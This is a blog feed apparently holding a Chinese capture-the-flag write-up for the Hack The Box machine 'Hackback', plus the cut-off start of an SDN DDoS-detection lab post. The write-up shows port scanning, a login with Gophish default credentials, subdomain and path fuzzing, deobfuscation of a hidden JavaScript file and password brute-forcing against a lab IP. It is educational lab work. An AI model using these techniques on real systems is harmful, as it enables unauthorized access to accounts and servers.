<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦梦的小站</title>
  
  <subtitle>只要没完蛋，就还可以继续。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.lanbainan.cn/"/>
  <updated>2019-07-14T15:31:47.271Z</updated>
  <id>http://www.lanbainan.cn/</id>
  
  <author>
    <name>EV</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>对Hackback的测试</title>
    <link href="http://www.lanbainan.cn/2019/07/14/2019-07-14/"/>
    <id>http://www.lanbainan.cn/2019/07/14/2019-07-14/</id>
    <published>2019-07-14T07:58:00.000Z</published>
    <updated>2019-07-14T15:31:47.271Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hackback"><a href="#Hackback" class="headerlink" title="Hackback"></a>Hackback</h1><p>靶机：10.10.10.128<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/176" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/176</a><br><a id="more"></a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>masscan、nmap大法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -e tun0 -p1-65535 10.10.10.128 --rate=2000</span><br><span class="line">Discovered open port 64831/tcp on 10.10.10.128</span><br><span class="line">Discovered open port 80/tcp on 10.10.10.128</span><br><span class="line">Discovered open port 6666/tcp on 10.10.10.128</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p80,6666,64831 10.10.10.128</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">6666/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Site doesnt have a title.</span><br><span class="line">64831/tcp open  ssl/unknown</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest:</span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzUyMnxJblZaU201bFJ6SkNNM0EyVGpWM1JGVXljbkpzVlZaVU9XdGhVMmxFUkZoRU1uUlVjVVpaTlZkaGJFazlJZ289fHoXSViyQX7JMh2ssjivT-w2ie4GljJeBBDraE3CxtFj; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:42 GMT</span><br><span class="line">|     Content-Length: 19</span><br><span class="line">|     page not found</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Location: /login?next=%2F</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzQ4N3xJbTVRYW5vMlNVNVRjV2gzVEdjMWRXODJWR1pZZWk4MWF6SXJiblJRWkZCNEt6WnVSVEJDUzNOWU5tTTlJZ289fHM9UmUFieLG1PlH4n-LguBPZFhXuWIXVHODube95gkf; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:07 GMT</span><br><span class="line">|     Content-Length: 38</span><br><span class="line">|     href=&quot;/login?next=%2F&quot;&gt;Found&lt;/a&gt;.</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Location: /login?next=%2F</span><br><span class="line">|     Set-Cookie: _gorilla_csrf=MTU2MzExNzQ4OHxJbXRLYWpjMFlsY3pia2h0WTBsWWNVOTFZa3hyUjBNcmIyUTRNemxMWkVvNFZtaFVPVFZUZFVkamFrRTlJZ289fPlPo9jtOy7SCPPtw6lWQMnAU8hlLEcxaIZxwfiiz1L5; HttpOnly; Secure</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     Date: Sun, 14 Jul 2019 15:18:08 GMT</span><br><span class="line">|_    Content-Length: 0</span><br><span class="line">| ssl-cert: Subject: organizationName=Gophish</span><br><span class="line">| Issuer: organizationName=Gophish</span><br><span class="line">| Public Key type: ec</span><br><span class="line">| Public Key bits: 384</span><br><span class="line">| Signature Algorithm: ecdsa-with-SHA384</span><br><span class="line">| Not valid before: 2018-11-22T03:49:52</span><br><span class="line">| Not valid after:  2028-11-19T03:49:52</span><br><span class="line">| MD5:   a00e abee 5be1 2925 7276 a5d7 df2f c1b4</span><br><span class="line">|_SHA-1: 1124 a9ee 28ba 3656 312e a925 c6ea 3010 be63 d1af</span><br></pre></td></tr></table></figure><p>80端口的一头驴<br><img src="https://i.loli.net/2019/07/14/5d2ae27f5ecef26520.png" alt="1.png"><br>6666端口<br><img src="https://i.loli.net/2019/07/14/5d2ae73e9c62419386.png" alt="2.png"><br>64831端口，开着ssl，运行Gophish<br><img src="https://i.loli.net/2019/07/14/5d2af0850bee535210.png" alt="3.png"></p><h2 id="测试ing"><a href="#测试ing" class="headerlink" title="测试ing"></a>测试ing</h2><p>根据提示，测试命令，返回当前可用参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl http://10.10.10.128:6666/help</span><br><span class="line">&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;</span><br></pre></td></tr></table></figure></p><p>能够使用默认口令登录Gophish<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/gophish</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/14/5d2af146e60ac62725.png" alt="4.png"><br>仅有的信息<br><img src="https://i.loli.net/2019/07/14/5d2af1de127d919734.png" alt="5.png"><br>从模板中，发现了有趣的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;&lt;!-- http://admin.hackback.htb --&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;You have been awarded with the 1st blood. &lt;a href=&quot;http://www.hackthebox.htb&quot;&gt;Catch it now&lt;/a&gt;!&amp;nbsp; &amp;nbsp;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>那么将得到三个域名<code>www.hackthebox.htb</code>，<code>hackthebox.htb</code>和<code>admin.hackback.htb</code>,加入hosts<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.128 www.hackthebox.htb #HTB登录页面</span><br><span class="line">10.10.10.128 hackthebox.htb</span><br><span class="line">10.10.10.128 admin.hackback.htb</span><br></pre></td></tr></table></figure></p><p>也可以使用模糊测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz --hc 614 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http://10.10.10.128</span><br></pre></td></tr></table></figure></p><h2 id="url测试"><a href="#url测试" class="headerlink" title="url测试"></a>url测试</h2><p>在<code>admin.hackback.htb</code>发现新的登录界面<br><img src="https://i.loli.net/2019/07/14/5d2af6983e80a81834.png" alt="6.png"><br>在html中发现线索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;script SRC=&quot;js/.js&quot;&gt;&lt;/script&gt; --&gt;</span><br></pre></td></tr></table></figure></p><p>直接访问404,测试js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowerc ase.txt -x js -u http://admin.hackback.htb/js</span><br><span class="line">/private.js (Status: 200)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://admin.hackback.htb/js/private.js</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/14/5d2afa89bbecc51544.png" alt="7.png"><br>这里使用了凯撒加密，<code>ine n=</code>应该是<code>var x=</code>,这很js。<br>v是第22个字母，而i第9个字母。22 - 9 = 13<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">var a = [&apos;\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33&apos;, &apos;\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d&apos;, &apos;\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68&apos;];</span><br><span class="line">(function(c, d) &#123;</span><br><span class="line">    var e = function(f) &#123;</span><br><span class="line">        while (--f) &#123;</span><br><span class="line">            c[&apos;push&apos;](c[&apos;shift&apos;]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, 0x66));</span><br><span class="line">var b = function(c, d) &#123;</span><br><span class="line">    c = c - 0x0;</span><br><span class="line">    var e = a[c];</span><br><span class="line">    if (b[&apos;MsULmv&apos;] === undefined) &#123;</span><br><span class="line">        (function() &#123;</span><br><span class="line">            var f;</span><br><span class="line">            try &#123;</span><br><span class="line">                var g = Function(&apos;return\x20(function()\x20&apos; + &apos;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&apos; + &apos;);&apos;);</span><br><span class="line">                f = g();</span><br><span class="line">            &#125; catch (h) &#123;</span><br><span class="line">                f = window;</span><br><span class="line">            &#125;</span><br><span class="line">            var i = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&apos;;</span><br><span class="line">            f[&apos;atob&apos;] || (f[&apos;atob&apos;] = function(j) &#123;</span><br><span class="line">                var k = String(j)[&apos;replace&apos;](/=+$/, &apos;&apos;);</span><br><span class="line">                for (var l = 0x0, m, n, o = 0x0, p = &apos;&apos;; n = k[&apos;charAt&apos;](o++); ~n &amp;&amp; (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String[&apos;fromCharCode&apos;](0xff &amp; m &gt;&gt; (-0x2 * l &amp; 0x6)) : 0x0) &#123;</span><br><span class="line">                    n = i[&apos;indexOf&apos;](n);</span><br><span class="line">                &#125;</span><br><span class="line">                return p;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        var q = function(r, d) &#123;</span><br><span class="line">            var t = [],</span><br><span class="line">                u = 0x0,</span><br><span class="line">                v, w = &apos;&apos;,</span><br><span class="line">                x = &apos;&apos;;</span><br><span class="line">            r = atob(r);</span><br><span class="line">            for (var y = 0x0, z = r[&apos;length&apos;]; y &lt; z; y++) &#123;</span><br><span class="line">                x += &apos;%&apos; + (&apos;00&apos; + r[&apos;charCodeAt&apos;](y)[&apos;toString&apos;](0x10))[&apos;slice&apos;](-0x2);</span><br><span class="line">            &#125;</span><br><span class="line">            r = decodeURIComponent(x);</span><br><span class="line">            for (var A = 0x0; A &lt; 0x100; A++) &#123;</span><br><span class="line">                t[A] = A;</span><br><span class="line">            &#125;</span><br><span class="line">            for (A = 0x0; A &lt; 0x100; A++) &#123;</span><br><span class="line">                u = (u + t[A] + d[&apos;charCodeAt&apos;](A % d[&apos;length&apos;])) % 0x100;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">            &#125;</span><br><span class="line">            A = 0x0;</span><br><span class="line">            u = 0x0;</span><br><span class="line">            for (var B = 0x0; B &lt; r[&apos;length&apos;]; B++) &#123;</span><br><span class="line">                A = (A + 0x1) % 0x100;</span><br><span class="line">                u = (u + t[A]) % 0x100;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">                w += String[&apos;fromCharCode&apos;](r[&apos;charCodeAt&apos;](B) ^ t[(t[A] + t[u]) % 0x100]);</span><br><span class="line">            &#125;</span><br><span class="line">            return w;</span><br><span class="line">        &#125;;</span><br><span class="line">        b[&apos;OoACcd&apos;] = q;</span><br><span class="line">        b[&apos;qSLwGk&apos;] = &#123;&#125;;</span><br><span class="line">        b[&apos;MsULmv&apos;] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    var C = b[&apos;qSLwGk&apos;][c];</span><br><span class="line">    if (C === undefined) &#123;</span><br><span class="line">        if (b[&apos;pIjlQB&apos;] === undefined) &#123;</span><br><span class="line">            b[&apos;pIjlQB&apos;] = !![];</span><br><span class="line">        &#125;</span><br><span class="line">        e = b[&apos;OoACcd&apos;](e, d);</span><br><span class="line">        b[&apos;qSLwGk&apos;][c] = e;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        e = C;</span><br><span class="line">    &#125;</span><br><span class="line">    return e;</span><br><span class="line">&#125;;</span><br><span class="line">var x = &apos;\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73&apos;;</span><br><span class="line">var z = b(&apos;0x0&apos;, &apos;\x50\x5d\x53\x36&apos;);</span><br><span class="line">var h = b(&apos;0x1&apos;, &apos;\x72\x37\x54\x59&apos;);</span><br><span class="line">var y = b(&apos;0x2&apos;, &apos;\x44\x41\x71\x67&apos;);</span><br><span class="line">var t = &apos;\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29&apos;;</span><br><span class="line">var s = &apos;\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29&apos;;</span><br><span class="line">var i = &apos;\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a&apos;;</span><br><span class="line">var k = &apos;\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d&apos;;</span><br><span class="line">var w = &apos;\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79&apos;;</span><br></pre></td></tr></table></figure></p><p>注意大小写问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nodejs</span><br><span class="line">&gt;代码-----代码</span><br><span class="line">&gt; x</span><br><span class="line">&apos;Secure Login Bypass&apos;</span><br><span class="line">&gt; z</span><br><span class="line">&apos;Remember the secret path is&apos;</span><br><span class="line">&gt; h</span><br><span class="line">&apos;2bb6916122f1da34dcd916421e531578&apos;</span><br><span class="line">&gt; y</span><br><span class="line">&apos;Just in case I loose access to the admin panel&apos;</span><br><span class="line">&gt; t</span><br><span class="line">&apos;?action=(show,list,exec,init)&apos;</span><br><span class="line">&gt; s</span><br><span class="line">&apos;&amp;site=(twitter,paypal,facebook,hackthebox)&apos;</span><br><span class="line">&gt; i</span><br><span class="line">&apos;&amp;password=********&apos;</span><br><span class="line">&gt; k</span><br><span class="line">&apos;&amp;session=&apos;</span><br><span class="line">&gt; w</span><br><span class="line">&apos;Nothing more to say&apos;</span><br></pre></td></tr></table></figure></p><p>隐藏目录<code>/2bb6916122f1da34dcd916421e531578</code>,但是被重定向了，但是这证明目录确实存在，查找目录下网页<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc 404 -t 20</span><br><span class="line">http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ</span><br><span class="line">002180:  C=403     57 L      191 W         2452 Ch        &quot;/Trace.axd&quot;</span><br><span class="line">002288:  C=302      0 L        0 W            0 Ch        &quot;/webadmin.php&quot;</span><br><span class="line">000004:  C=400     80 L      276 W         3420 Ch        &quot;/%3f/&quot;</span><br></pre></td></tr></table></figure></p><p>再来看js<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var t = &apos;?action=(show,list,exec,init)&apos;;</span><br><span class="line">var s = &apos;&amp;site=(twitter,paypal,facebook,hackthebox)&apos;;</span><br><span class="line">var i = &apos;&amp;password=********&apos;;</span><br><span class="line">var k = &apos;&amp;session=&apos;;</span><br><span class="line">var w = &apos;Nothing more to say&apos;;</span><br></pre></td></tr></table></figure></p><p>将actions，sites模糊处理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat actions.txt</span><br><span class="line">show</span><br><span class="line">list</span><br><span class="line">exec</span><br><span class="line">init</span><br><span class="line">root@kali:~# cat sites.txt</span><br><span class="line">twitter</span><br><span class="line">paypal</span><br><span class="line">facebook</span><br><span class="line">hackthebox</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# wfuzz -w actions.txt -w sites.txt --hc 404 &quot;http://admin.hackback.htb/2b b6916122f1da34dcd916421e531578/webadmin.php?action=FUZZ&amp;site=FUZ2Z&amp;password =test&amp;session=test&quot;</span><br></pre></td></tr></table></figure><p>得到最终结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# curl &apos;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=test&amp;session=test&apos;</span><br><span class="line">Wrong secret key!</span><br></pre></td></tr></table></figure></p><p>出现预期信息<br>测试passwd参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# wfuzz -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt &quot;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ&quot;</span><br><span class="line">000008:  C=302      8 L       18 W          277 Ch        &quot;12345678&quot;</span><br></pre></td></tr></table></figure></p><p>最后测试session时，发现cookie不变<br><img src="https://i.loli.net/2019/07/14/5d2b0fa4a446e54147.png" alt="8.png"><br>是自己IP的SHA256哈希<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Hackback&quot;&gt;&lt;a href=&quot;#Hackback&quot; class=&quot;headerlink&quot; title=&quot;Hackback&quot;&gt;&lt;/a&gt;Hackback&lt;/h1&gt;&lt;p&gt;靶机：10.10.10.128&lt;br&gt;kali：10.10.15.83&lt;br&gt;实验目的：找到flag&lt;br&gt;项目地址：&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/176&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.hackthebox.eu/home/machines/profile/176&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>DDoS攻击检测与防御</title>
    <link href="http://www.lanbainan.cn/2019/07/07/2019-07-07/"/>
    <id>http://www.lanbainan.cn/2019/07/07/2019-07-07/</id>
    <published>2019-07-07T08:44:00.000Z</published>
    <updated>2019-07-09T13:33:45.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本实验是基于SDN的DDoS检查与防御</p><blockquote><ul><li>Ubuntu</li><li>sFlow-R</li><li>Mininet</li><li>Floodlight (注意版本和jdk的问题)</li></ul></blockquote><p>其他问题不大<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>启动Floodlight<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd floodlight</span><br><span class="line">$ java -jar target/floodlight.jar</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/07/07/5d20c8232e40c86825.png" alt="2.png"><br><img src="https://i.loli.net/2019/07/07/5d20c81cb062172276.png" alt="3.png"><br>可以看见监听6653端口，8080是Floodight的Web端口<br><img src="https://i.loli.net/2019/07/07/5d20c675d07d384125.png" alt="1.png"></p><h2 id="mininet"><a href="#mininet" class="headerlink" title="mininet"></a>mininet</h2><p>Mininet是由一些虚拟的终端节点（end-hosts）、交换机、路由器连接而成的一个网络仿真器，它采用轻量级的虚拟化技术使得系统可以和真实网络相媲美。<br>Mininet可以很方便地创建一个支持SDN的网络：host就像真实的电脑一样工作，可以使用ssh登录，启动应用程序，程序可以向以太网端口发送数据包，数据包会被交换机、路由器接收并处理。有了这个网络，就可以灵活地为网络添加新的功能并进行相关测试，然后轻松部署到真实的硬件环境中。</p><h3 id="构建简单拓扑"><a href="#构建简单拓扑" class="headerlink" title="构建简单拓扑"></a>构建简单拓扑</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mn --controller=remote,ip=127.0.0.1,port=6653 --topo=single,3</span><br><span class="line">mininet&gt;</span><br></pre></td></tr></table></figure><blockquote><p>mn：mininet命令简写<br>–controller=remote：使用远程的控制器<br>ip,port：控制器的ip和端口<br>–topo：指定拓扑类型，single 就是单一拓扑，就是最简单的交换机下面接主机，后面的3 表示，三台主机。</p></blockquote><hr><h3 id="mininet基本命令"><a href="#mininet基本命令" class="headerlink" title="mininet基本命令"></a>mininet基本命令</h3><blockquote><ul><li>nodes 指令显示节点信息</li><li>links指令显示链路信息</li><li>pingall检测网络链路连通性情况</li></ul></blockquote><p>floodlight提供图形界面<br><img src="https://i.loli.net/2019/07/07/5d2203898ddf180486.png" alt="4.png"></p><h1 